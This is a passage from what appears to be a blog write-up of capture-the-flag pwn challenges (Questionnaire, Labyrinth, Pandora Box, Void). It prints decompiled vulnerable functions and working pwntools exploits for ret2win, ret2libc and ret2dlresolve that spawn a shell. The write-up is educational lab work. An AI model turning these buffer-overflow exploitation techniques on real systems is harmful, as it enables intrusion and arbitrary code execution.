class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re, os</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./gs&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;46.101.73.55&#x27;,32078)</span></span><br><span class="line">p = process()</span><br><span class="line"></span><br><span class="line">offset = <span class="number">100</span></span><br><span class="line">payload = cyclic(offset)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">content = p.recvall()</span><br><span class="line">flag = re.findall(<span class="string">r&#x27;HTB\&#123;.*\&#125;&#x27;</span>, <span class="built_in">str</span>(content))</span><br><span class="line">os.system(<span class="string">&#x27;clear&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nflag &quot;</span>,flag[<span class="number">0</span>]) </span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Questionnaire"><a href="#Questionnaire" class="headerlink" title="Questionnaire"></a>Questionnaire</h2><p><img src="/imgs/post3/pwn/Questionnaire.png" alt="Questionnaire"></p><p>it was simple ret2win challenge, had to call function name <strong>gg</strong> overwriting the RIP of <strong>vuln</strong> function.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">gg</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process()</span><br><span class="line"><span class="comment">#p = remote(&#x27;209.97.134.50&#x27;,32698)</span></span><br><span class="line">offset = <span class="number">40</span></span><br><span class="line">ret = <span class="number">0x00000000004004ce</span></span><br><span class="line">gg = <span class="number">0x00000000004004ce</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(offset) + pack(ret) + pack(gg)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/imgs/post3/pwn/qutionnaire_op.png" alt="qutionnaire_op"></p><h2 id="Labyrinth"><a href="#Labyrinth" class="headerlink" title="Labyrinth"></a>Labyrinth</h2><p><img src="/imgs/post3/pwn/labyrinth.png" alt="labyrinth"></p><p>almost same as previous challenge (Questionnaire) with extra fancy things.<br>lets debug the binary’s main function </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>  undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"> 2  </span><br><span class="line"> 3  &#123;</span><br><span class="line"> <span class="number">4</span>    <span class="type">int</span> iVar1;</span><br><span class="line"> <span class="number">5</span>    undefined8 local_38;</span><br><span class="line"> <span class="number">6</span>    undefined8 local_30;</span><br><span class="line"> <span class="number">7</span>    undefined8 local_28;</span><br><span class="line"> <span class="number">8</span>    undefined8 local_20;</span><br><span class="line"> <span class="number">9</span>    <span class="type">char</span> *local_18;</span><br><span class="line"><span class="number">10</span>    ulong local_10;</span><br><span class="line"><span class="number">11</span>    </span><br><span class="line"><span class="number">12</span>    setup();</span><br><span class="line"><span class="number">13</span>    banner();</span><br><span class="line"><span class="number">14</span>    local_38 = <span class="number">0</span>;</span><br><span class="line"><span class="number">15</span>    local_30 = <span class="number">0</span>;</span><br><span class="line"><span class="number">16</span>    local_28 = <span class="number">0</span>;</span><br><span class="line"><span class="number">17</span>    local_20 = <span class="number">0</span>;</span><br><span class="line"><span class="number">18</span>    fwrite(<span class="string">&quot;\nSelect door: \n\n&quot;</span>,<span class="number">1</span>,<span class="number">0x10</span>,<span class="built_in">stdout</span>);</span><br><span class="line"><span class="number">19</span>    <span class="keyword">for</span> (local_10 = <span class="number">1</span>; local_10 &lt; <span class="number">0x65</span>; local_10 = local_10 + <span class="number">1</span>) &#123;</span><br><span class="line"><span class="number">20</span>      <span class="keyword">if</span> (local_10 &lt; <span class="number">10</span>) &#123;</span><br><span class="line"><span class="number">21</span>        <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,<span class="string">&quot;Door: 00%d &quot;</span>,local_10);</span><br><span class="line"><span class="number">22</span>      &#125;</span><br><span class="line"><span class="number">23</span>      <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">24</span>        <span class="keyword">if</span> (local_10 &lt; <span class="number">100</span>) &#123;</span><br><span class="line"><span class="number">25</span>          <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,<span class="string">&quot;Door: 0%d &quot;</span>,local_10);</span><br><span class="line"><span class="number">26</span>        &#125;</span><br><span class="line"><span class="number">27</span>        <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">28</span>          <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,<span class="string">&quot;Door: %d &quot;</span>,local_10);</span><br><span class="line"><span class="number">29</span>        &#125;</span><br><span class="line"><span class="number">30</span>      &#125;</span><br><span class="line"><span class="number">31</span>      <span class="keyword">if</span> ((local_10 % <span class="number">10</span> == <span class="number">0</span>) &amp;&amp; (local_10 != <span class="number">0</span>)) &#123;</span><br><span class="line"><span class="number">32</span>        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line"><span class="number">33</span>      &#125;</span><br><span class="line"><span class="number">34</span>    &#125;</span><br><span class="line"><span class="number">35</span>    fwrite(&amp;DAT_0040248f,<span class="number">1</span>,<span class="number">4</span>,<span class="built_in">stdout</span>);</span><br><span class="line"><span class="number">36</span>    local_18 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="number">37</span>    fgets(local_18,<span class="number">5</span>,<span class="built_in">stdin</span>);</span><br><span class="line"><span class="number">38</span>    iVar1 = <span class="built_in">strncmp</span>(local_18,<span class="string">&quot;69&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="number">39</span>    <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">40</span>      iVar1 = <span class="built_in">strncmp</span>(local_18,<span class="string">&quot;069&quot;</span>,<span class="number">3</span>);</span><br><span class="line"><span class="number">41</span>      <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) <span class="keyword">goto</span> LAB_004015da;</span><br><span class="line"><span class="number">42</span>    &#125;</span><br><span class="line"><span class="number">43</span>    fwrite(<span class="string">&quot;\nYou are heading to open the door but you suddenly see something on the wall:\n\n\&quot;Fly like a bird and be free!\&quot;\n\nWould you like to change the door you chose?\n\n&gt;&gt; &quot;</span></span><br><span class="line"><span class="number">44</span>           ,<span class="number">1</span>,<span class="number">0xa0</span>,<span class="built_in">stdout</span>);</span><br><span class="line"><span class="number">45</span>    fgets((<span class="type">char</span> *)&amp;local_38,<span class="number">0x44</span>,<span class="built_in">stdin</span>);</span><br><span class="line"><span class="number">46</span>  LAB_004015da:</span><br><span class="line"><span class="number">47</span>    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,<span class="string">&quot;\n%s[-] YOU FAILED TO ESCAPE!\n\n&quot;</span>,&amp;DAT_00402541);</span><br><span class="line"><span class="number">48</span>    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">49</span>  &#125;</span><br></pre></td></tr></table></figure><p>at line number <strong>38</strong> variable local_18 that is user input being compared by <strong>69</strong> and if it is equal <strong>69</strong> call the <strong>fwrite</strong> function that is printing some message and at line number <strong>45</strong>, <strong>fgets</strong> function being called but as you can see there is catch over there</p><p>The variable <code>local_38</code> is declared as an <code>undefined8</code> type, which is an 8-byte (64-bit) variable. However, in the <code>fgets()</code> function call, the size argument <code>0x44</code> (hexadecimal 44, decimal 68) specifies that <code>fgets()</code> should read up to 68 bytes from <code>stdin</code> and store them in the memory location starting at <code>&amp;local_38</code>.</p><p>Since <code>local_38</code> is only 8 bytes long, and <code>fgets()</code> can read up to 68 bytes, this means that <code>fgets()</code> can write up to 60 bytes beyond the end of <code>local_38</code>. This can lead to a buffer overflow, which can cause undefined behavior, including crashing the program, overwriting other variables, and executing arbitrary code.</p><p>so now we just have to find the offset of <strong>RIP</strong> and overwrite with some evil function if we have any, and yeah we have this binary contain never called function <strong>escape_plan</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">escape_plan</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> sVar1;</span><br><span class="line">  <span class="type">char</span> local_d;</span><br><span class="line">  <span class="type">int</span> local_c;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  fwrite(&amp;DAT_00402018,<span class="number">1</span>,<span class="number">0x1f0</span>,<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,</span><br><span class="line">          <span class="string">&quot;\n%sCongratulations on escaping! Here is a sacred spell to help you continue your journey: %s\n&quot;</span></span><br><span class="line">          ,&amp;DAT_0040220e,&amp;DAT_00402209);</span><br><span class="line">  local_c = open(<span class="string">&quot;./flag.txt&quot;</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (local_c &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;\nError opening flag.txt, please contact an Administrator.\n\n&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">    sVar1 = read(local_c,&amp;local_d,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (sVar1 &lt; <span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line">    fputc((<span class="type">int</span>)local_d,<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  close(local_c);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>that print the flag so this is our target function, so lets write the exploit.</p><h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./labyrinth&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process() </span><br><span class="line"><span class="comment">#io = remote(&#x27;46.101.73.33&#x27;,30473)</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">56</span>) + pack(<span class="number">0x0000000000401016</span>) + pack(<span class="number">0x0000000000401255</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&#x27;69&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/imgs/post3/pwn/labyrinth_op.png" alt="labyrinth_op"></p><h2 id="Pandora-Box"><a href="#Pandora-Box" class="headerlink" title="Pandora Box"></a>Pandora Box</h2><p><img src="/imgs/post3/pwn/pendora.png" alt="pandora_box"></p><p>binary ask to choose the option, opening the box cause binary to exit and choosing second option prompt us to <strong>Insert location of the library</strong>, might be ret2libc attack where we have to have the  address of libc function like system if this binary has buffer overflow okay okay lets just not make assumption for now, ask to ghidra. </p><p><img src="/imgs/post3/pwn/pandora_box.png" alt="pandora_box"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>  <span class="type">void</span> <span class="title function_">box</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">2  </span><br><span class="line">3  &#123;</span><br><span class="line"><span class="number">4</span>    undefined8 local_38;</span><br><span class="line"><span class="number">5</span>    undefined8 local_30;</span><br><span class="line"><span class="number">6</span>    undefined8 local_28;</span><br><span class="line"><span class="number">7</span>    undefined8 local_20;</span><br><span class="line"><span class="number">8</span>    <span class="type">long</span> local_10;</span><br><span class="line"><span class="number">9</span>    </span><br><span class="line"><span class="number">10</span>   local_38 = <span class="number">0</span>;</span><br><span class="line"><span class="number">11</span>   local_30 = <span class="number">0</span>;</span><br><span class="line"><span class="number">12</span>   local_28 = <span class="number">0</span>;</span><br><span class="line"><span class="number">13</span>   local_20 = <span class="number">0</span>;</span><br><span class="line"><span class="number">14</span>   fwrite(<span class="string">&quot;This is one of Pandora\&#x27;s mythical boxes!\n\nWill you open it or Return it to the Library for analysis?\n\n1. Open.\n2. Return.\n\n&gt;&gt; &quot;</span></span><br><span class="line"><span class="number">15</span>         ,<span class="number">1</span>,<span class="number">0x7e</span>,<span class="built_in">stdout</span>);</span><br><span class="line"><span class="number">16</span>   local_10 = read_num();</span><br><span class="line"><span class="number">17</span>   <span class="keyword">if</span> (local_10 != <span class="number">2</span>) &#123;</span><br><span class="line"><span class="number">18</span>     <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,<span class="string">&quot;%s\nWHAT HAVE YOU DONE?! WE ARE DOOMED!\n\n&quot;</span>,&amp;DAT_004021c7);</span><br><span class="line"><span class="number">19</span>                     <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line"><span class="number">20</span>     <span class="built_in">exit</span>(<span class="number">0x520</span>);</span><br><span class="line"><span class="number">21</span>   &#125;</span><br><span class="line"><span class="number">22</span>   fwrite(<span class="string">&quot;\nInsert location of the library: &quot;</span>,<span class="number">1</span>,<span class="number">0x21</span>,<span class="built_in">stdout</span>);</span><br><span class="line"><span class="number">23</span>   fgets((<span class="type">char</span> *)&amp;local_38,<span class="number">0x100</span>,<span class="built_in">stdin</span>);</span><br><span class="line"><span class="number">24</span>   fwrite(<span class="string">&quot;\nWe will deliver the mythical box to the Library for analysis, thank you!\n\n&quot;</span>,<span class="number">1</span>,<span class="number">0x4b</span>,</span><br><span class="line"><span class="number">25</span>         <span class="built_in">stdout</span>);</span><br><span class="line"><span class="number">26</span>   <span class="keyword">return</span>;</span><br><span class="line"><span class="number">27</span> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hmm everything looks good until we reach the line number <strong>23</strong>, same as previous challenge <strong>local_38</strong> is undefined variable that is 8 byte , However <strong>fgets()</strong> function’s size argument is <strong>0x100</strong>, 256 in decimal and again we got BOF.</p><p>but in case of this binary we do not have any evil&#x2F;win function to redirect the execution flow directly by overwriting the RIP with. that means WE could perform <strong>ret2libc</strong> or <strong>ret2shell</strong> but as we have NX enabled in this binary uploading the shell on the stack is not possible </p><p><img src="/imgs/post3/pwn/pb_checksec.png" alt="pb_checksec"></p><p>As for the ret2libc YES thumbs up! </p><h4 id="Requirement-for-ret2libc"><a href="#Requirement-for-ret2libc" class="headerlink" title="Requirement for ret2libc"></a>Requirement for ret2libc</h4><ul><li>libc base address</li><li>system address (we would already have after leaking libc anyway)</li><li>&#x2F;bin&#x2F;sh address</li><li>we have been given libc so need to worry about libc verison</li></ul><h3 id="Exploit-3"><a href="#Exploit-3" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pb&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.REMOTE:</span><br><span class="line">    p = remote(<span class="string">&#x27;165.232.98.59&#x27;</span>, <span class="number">32729</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(elf.path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_overflow</span>():</span><br><span class="line">    <span class="built_in">print</span>(p.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(p.recvuntil(<span class="string">&#x27;: &#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_libc</span>():</span><br><span class="line">    payload= <span class="string">b&quot;A&quot;</span> * <span class="number">56</span> <span class="comment"># paddding</span></span><br><span class="line">    payload+= p64(<span class="number">0x40142b</span>) <span class="comment"># pop rdi</span></span><br><span class="line">    payload+= p64(<span class="number">0x403fa0</span>) <span class="comment"># got_put</span></span><br><span class="line">    payload+= p64(<span class="number">0x401030</span>) <span class="comment"># plt_put</span></span><br><span class="line">    payload+= p64(<span class="number">0x4012c2</span>) <span class="comment"># adress of box function</span></span><br><span class="line"></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;thank you!\n\n&#x27;</span>)</span><br><span class="line">    leak = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> leak</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> log.progress(<span class="string">&quot;Step 1: Leak libc address, print the address of puts&quot;</span>):</span><br><span class="line">    get_overflow()</span><br><span class="line">    leak = leak_libc()</span><br><span class="line">    log.info(<span class="string">&quot;Leaked puts: &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(leak)))</span><br><span class="line">    libc.address = leak - <span class="number">0x80ed0</span> <span class="comment">#libc.symbols[&#x27;puts&#x27;]</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">with</span> log.progress(<span class="string">&quot;Step 2: use onegadget to get shell&quot;</span>):</span><br><span class="line">    get_overflow()</span><br><span class="line"></span><br><span class="line">    system = libc.sym.system </span><br><span class="line">    bin_sh = libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__() </span><br><span class="line"></span><br><span class="line">    payload=<span class="string">b&quot;A&quot;</span>*<span class="number">56</span></span><br><span class="line">    payload+=p64(<span class="number">0x401016</span>) <span class="comment"># ret</span></span><br><span class="line">    payload+=p64(<span class="number">0x40142b</span>) <span class="comment"># pop rdi</span></span><br><span class="line">    payload+= p64(bin_sh)</span><br><span class="line">    payload+= p64(system)</span><br><span class="line">   </span><br><span class="line">    p.sendline(payload) </span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/imgs/post3/pwn/pd_op.png" alt="pd_op"></p><h2 id="Void"><a href="#Void" class="headerlink" title="Void"></a>Void</h2><p><img src="/imgs/post3/pwn/void.png" alt="void"></p><blockquote><p>Description : The room goes dark and all you can see is a damaged terminal. Hack into it to restore the power and find your way out.</p></blockquote><p>this challenge made me scratch my head, but after getting some nudges from someone on discord i blamed by myself to being a lazy skipping the hands on and just having oral look up while learning new things.</p><p>binary doesn’t output any thing just take user input and goes dark, lets see on ghidra</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined local_48 [<span class="number">64</span>];</span><br><span class="line">  </span><br><span class="line">  read(<span class="number">0</span>,local_48,<span class="number">200</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1"></a>Method 1</h3><p>that i come across</p><p>so binary only have main and <strong>vuln</strong> function to our interest vuln have buffer overflow vuln as read function is taking more than it suppose to, okay but all good here till now i though it would same as previous one we would have to perform libc2libc technique </p><p>but when i started debugging binary to see which function is being call&#x2F;used from libc so that i can leak address and calculate base of libc </p><p><img src="/imgs/post3/pwn/void_got.png" alt="void_got"></p><p>there are not any, except <strong>read</strong> and despite i knew that i cant leak with read function i tried to search any previous challenges or writeup to see if in case there is any way to leak libc from read function only but no use </p><p>SO ret2libc with <strong>ret2csu</strong>  ? </p><p>no, although we have gadgets we are require to have libc function i.e. puts, printf here also, so we cant either ret2libc or chain ret2csu + ret2libc   </p><p>as i knew i could solve the challenge just needed hint to solve the challenge hint like technique we can use to solve this cahllenge i seek for help where i am reminded <strong>ret2dlresolve</strong> technique.</p><p>The ret2dlresolve technique leverages the dynamic linker&#x2F;loader functionality of a program to execute arbitrary code. and is typically employed when the program does not contain any useful functions like <strong>puts</strong> or <strong>printf</strong> in our case or gadgets that can be used to achieve code execution.</p><p>named “ret2dlresolve” as it involves overwriting the return address on the stack to point to a “resolve” function in the dynamic linker (usually <code>__dl_resolve</code>) rather than returning to the original calling function. The <code>__dl_resolve</code> function is responsible for resolving and loading shared library dependencies at runtime.</p><p>so basially During a ret2dlresolve, we tricks the binary into resolving a function of our choice (such as <code>system</code>) into the PLT. This means we can use the PLT function as if it was originally part of the binary, bypassing ASLR (if present) and requiring no libc leaks. </p><h4 id="Exploit-4"><a href="#Exploit-4" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">        elf = context.binary = ELF(<span class="string">&#x27;./void&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">        p = elf.process()</span><br><span class="line"></span><br><span class="line">        <span class="comment">#p = remote(&#x27;104.248.169.177&#x27;,31673)</span></span><br><span class="line"></span><br><span class="line">        rop = ROP(elf)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create the dlresolve object</span></span><br><span class="line">        dlresolve = Ret2dlresolvePayload(elf, symbol=<span class="string">&#x27;system&#x27;</span>, args=[<span class="string">&#x27;/bin/sh&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        rop.raw(<span class="string">&#x27;A&#x27;</span> * <span class="number">72</span>)</span><br><span class="line">        rop.read(<span class="number">0</span>, dlresolve.data_addr) <span class="comment"># read to where we want to write the fake structures</span></span><br><span class="line">        rop.ret2dlresolve(dlresolve)     <span class="comment"># call .plt and dl-resolve() with the correct, calculated reloc_offset</span></span><br><span class="line"></span><br><span class="line">        log.info(rop.dump())</span><br><span class="line"></span><br><span class="line">        p.sendline(rop.chain())</span><br><span class="line">        p.sendline(dlresolve.payload)    <span class="comment"># now the read is called and we pass all the relevant structures in</span></span><br><span class="line"></span><br><span class="line">        p.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/imgs/post3/pwn/void_op.png" alt="void_op"></p><p>check sources below if you wish to dive more deep </p><h4 id="Sources"><a href="#Sources" class="headerlink" title="Sources :"></a>Sources :</h4><p><a href="https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf">https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf</a><br><a href="https://kileak.github.io/ctf/2018/0ctf-qual-babystack/">https://kileak.github.io/ctf/2018/0ctf-qual-babystack/</a><br><a href="https://www.youtube.com/watch?v=6wmyaYP5WkA">https://www.youtube.com/watch?v=6wmyaYP5WkA</a><br><a href="https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve">https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve</a> </p><h3 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2"></a>Method 